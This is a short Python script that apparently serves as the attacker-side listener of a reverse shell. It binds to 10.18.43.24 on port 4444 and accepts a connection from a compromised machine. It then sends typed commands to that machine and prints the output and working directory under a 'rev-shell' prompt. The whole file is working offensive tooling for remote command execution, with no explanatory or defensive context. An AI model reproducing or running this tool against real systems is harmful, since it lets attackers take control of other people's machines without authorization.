#!/usr/bin/python3

import socket

SERVER_HOST = "10.18.43.24"
SERVER_PORT = 4444

BUFFER_SIZE = 1024 * 128
SEPARATOR = "<sep>"

s = socket.socket()
s.bind((SERVER_HOST, SERVER_PORT))
s.listen(5)

print(f"Listening on [{SERVER_HOST}] {SERVER_PORT} ...")

client_socket, client_address = s.accept()
print(f"{client_address[0]} {client_address[1]} connected!")

cwd = client_socket.recv(BUFFER_SIZE).decode()

while True:
    print(" ")
    command = input(f"""┌─[rev-shell@{SERVER_HOST}]─[~{cwd}]\n└──╼ $ """)
    
    if not command.strip(): continue
    client_socket.send(command.encode())
    
    if command.lower() == "exit": break

    output = client_socket.recv(BUFFER_SIZE).decode()
    results, cwd = output.split(SEPARATOR)
    print(results)
